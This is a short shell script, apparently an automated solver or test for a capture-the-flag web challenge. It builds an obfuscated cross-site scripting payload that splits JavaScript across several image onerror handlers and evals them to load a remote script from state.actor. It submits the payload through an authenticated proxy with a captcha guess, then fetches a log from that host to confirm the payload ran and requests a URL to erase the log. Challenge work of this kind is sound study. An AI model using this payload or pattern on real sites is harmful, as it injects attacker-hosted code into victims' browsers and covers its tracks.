#!/bin/sh

PAYLOAD=$(cat <<'EOF'
http://172.17.0.2:5000/ooops/d35fs23hu73ds/blocked.html?=<img src=a onerror=a='z=document.createElement'>_______<img src=a onerror=b='(\'script\');z.src=\'//state'>___<img src=a onerror=c='.actor/bad.js\';document.body'>__<img src=a onerror=d='.appendChild(z);'>_________________<img src=aa onerror=eval(a+b+c+d)>_______________________
EOF
)

echo "Sending broken malicious request through proxy"

http_proxy=http://OnlyOne:Overflow@127.0.0.1:8080/ curl -s 'http://example.com/ooops/d35fs23hu73ds/reviewed.html' \
  -H 'Content-Type: application/x-www-form-urlencoded' -H 'Proxy-Authorization: Basic T25seU9uZTpPdmVyZmxvdw==' \
  -H 'Connection: keep-alive' \
  --data-urlencode "captcha_id=EFYGP.png" \
  --data-urlencode "captcha_guess=fasanotesting" \
  --data-urlencode "url=${PAYLOAD}" | grep -q "Thank you for your request"

#'

echo "Getting log from state.actor"
REMOTE="http://state.actor/ooops_test_suite.txt"

OUTPUT=$(curl -s $REMOTE | grep "SELECTs to the left and right")
STAGE2=$?

# Get logging url to erase log
echo "Clearing state.actor log"
curl -s http://state.actor/ooops_log.php  >/dev/null

if [ $STAGE2 -eq 0 ]; then
  echo "Success"
else
  echo "Failure"
fi

# Shoudln't contain the flag
exit $STAGE2
